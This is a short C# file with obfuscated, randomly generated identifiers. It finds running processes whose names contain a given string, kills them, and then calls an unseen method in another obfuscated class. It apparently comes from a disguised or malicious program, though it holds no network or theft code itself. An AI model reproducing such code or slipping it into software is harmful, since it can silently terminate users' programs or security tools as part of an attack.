using System;
using System.Diagnostics;

namespace YXHSMjloYIX;

public class HNyXYzEiea
{
	public static bool BwsROOquiIChk(Process tfyUfOHNQVJ, string XRUrsHLyCDyEigH)
	{
		try
		{
			return tfyUfOHNQVJ.ProcessName.ToLower().Contains(XRUrsHLyCDyEigH.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void AdNcucwLWi(string taOcbSrxrqxOeK, string DOUVVKhCYCng)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (BwsROOquiIChk(process, taOcbSrxrqxOeK.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					zkwozuPRYYOVZ.vbjShwojRkogcTDaJ();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
